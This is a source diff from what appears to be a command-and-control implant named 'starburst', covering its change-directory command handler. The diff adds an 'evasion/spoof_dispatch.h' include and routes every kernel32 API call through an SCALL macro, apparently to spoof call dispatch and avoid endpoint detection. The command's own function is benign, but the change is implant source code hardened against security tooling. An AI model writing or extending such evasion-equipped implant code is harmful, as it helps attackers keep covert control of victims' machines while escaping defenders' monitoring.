@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_CD
 
@@ -29,9 +30,9 @@ auto declfn starburst::cmd_cd(
     memory::copy( path_buf, path, copy_len );
 
     wchar_t wpath[520] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, path_buf, -1, wpath, 520 );
 
-    if ( !inst.kernel32.SetCurrentDirectoryW( wpath ) ) {
+    if ( !SCALL( inst, kernel32.SetCurrentDirectoryW, wpath ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "SetCurrentDirectoryW failed" ) ) );
         return;
@@ -39,10 +40,10 @@ auto declfn starburst::cmd_cd(
 
     // return new cwd
     wchar_t new_dir_w[520] = { 0 };
-    inst.kernel32.GetCurrentDirectoryW( 520, new_dir_w );
+    SCALL( inst, kernel32.GetCurrentDirectoryW, 520, new_dir_w );
 
     char new_dir[520] = { 0 };
-    inst.kernel32.WideCharToMultiByte( CP_ACP, 0, new_dir_w, -1, new_dir, 520, nullptr, nullptr );
+    SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, new_dir_w, -1, new_dir, 520, nullptr, nullptr );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, new_dir );
 }
